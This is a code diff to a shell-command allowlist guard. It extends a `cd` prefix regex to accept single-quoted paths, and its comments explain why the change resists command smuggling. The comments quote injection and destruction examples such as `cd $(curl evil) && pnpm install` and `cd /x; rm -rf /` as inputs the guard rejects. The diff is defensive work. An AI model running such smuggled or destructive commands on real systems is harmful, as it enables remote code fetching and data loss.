@@ -49,11 +49,29 @@ export const CAPTURE_TAIL_JS_SRC =
 // only path characters — no whitespace, no quote, no `$`, no backtick, and no shell operator. So
 // `cd /x && pnpm install` passes while `cd $(curl evil) && pnpm install`, `cd /x; rm -rf /` and
 // `cd /x && pnpm install && rm -rf /` all still FAIL CLOSED.
+//
+// SPACES IN THE REPO PATH (2026-08-02). The bare token above admits no whitespace, so on a machine
+// whose checkout lives under `/Users/dean hiller/…`, "Google Drive", "My Documents" or an iCloud path,
+// the `cd` prefix was UNREACHABLE — every L0 escape hatch was untypable from a linked worktree, which
+// is the exact deadlock class the prefix was added to prevent. And `atRoot()` emitted the remedy
+// unquoted, so what the guard PRESCRIBED was already broken shell before any allowlist saw it.
+//
+// The cure is a SINGLE-QUOTED alternative, `'[^']+'`, and the single quotes ARE the security argument:
+// inside single quotes sh performs NO expansion whatsoever — `$(…)`, backticks, `$VAR`, `&&`, `;`, `|`
+// are all literal characters of the path — and the ONLY character that can end the quoted region is the
+// one the character class excludes. So the pattern is un-smuggleable BY CONSTRUCTION, with no cleverness
+// required: `cd '/Users/dean hiller/repo' && pnpm install` passes, and `cd '$(curl evil)' && pnpm
+// install` matches but is INERT (sh cds to a directory literally named `$(curl evil)`, which does not
+// exist, and `&&` short-circuits — nothing is fetched and nothing is executed).
+//
+// DOUBLE quotes are deliberately NOT accepted: `$` and backticks still expand inside them, so
+// `cd "$(curl evil)" && pnpm install` would be a real command substitution. It stays DENIED, as does
+// `cd "/Users/dean hiller/repo" && pnpm install` — the quote character itself is outside both branches.
 // Keep in sync with CD_PREFIX_JS_SRC (locked by a unit test).
-export const CD_PREFIX_ERE = '(cd[[:space:]]+[A-Za-z0-9._/@~+-]+[[:space:]]*&&[[:space:]]*)?';
+export const CD_PREFIX_ERE = "(cd[[:space:]]+([A-Za-z0-9._/@~+-]+|'[^']+')[[:space:]]*&&[[:space:]]*)?";
 
 // JS-regex-source twin of CD_PREFIX_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
-export const CD_PREFIX_JS_SRC = '(cd\\s+[A-Za-z0-9._\\/@~+-]+\\s*&&\\s*)?';
+export const CD_PREFIX_JS_SRC = "(cd\\s+([A-Za-z0-9._\\/@~+-]+|'[^']+')\\s*&&\\s*)?";
 
 // Every hatch below starts with the anchor + the optional `cd` prefix. Spliced in place of each
 // pattern's old bare `^`, so the anchoring at both ends is unchanged.
@@ -342,6 +360,16 @@ const L0_BODIES_JS = L0_ALLOWLIST.flatMap((e: L0AllowEntry): string[] => (e.js =
 // trailing `2>&1 | tail -N` are tolerated.
 export const L0_ALLOW_ERE =
     CD_PREFIX_ERE_ANCHORED + '(' + L0_BODIES_ERE.join('|') + ')' + CAPTURE_TAIL_ERE;
+
+// L0_ALLOW_ERE as it must be SPELLED inside a single-quoted sh string — i.e. the exact bytes the
+// rendered shim carries in `grep -Eq '<here>'`.
+//
+// It exists because CD_PREFIX_ERE now contains a literal `'` (the single-quoted-path branch), and a
+// `'` inside a single-quoted sh word ENDS the word. The standard cure is the `'\''` dance: close the
+// quote, emit an escaped literal quote, reopen. Splicing the raw ERE would produce a shim that is not
+// even valid sh, which is why this conversion lives here beside the pattern rather than in the
+// renderer — the pattern and its sh spelling must never be able to drift apart.
+export const L0_ALLOW_ERE_SH = L0_ALLOW_ERE.split("'").join(`'\\''`);
 
 // JS twin of L0_ALLOW_ERE. A unit test asserts the two agree on a shared sample set.
 export const L0_ALLOW_JS =
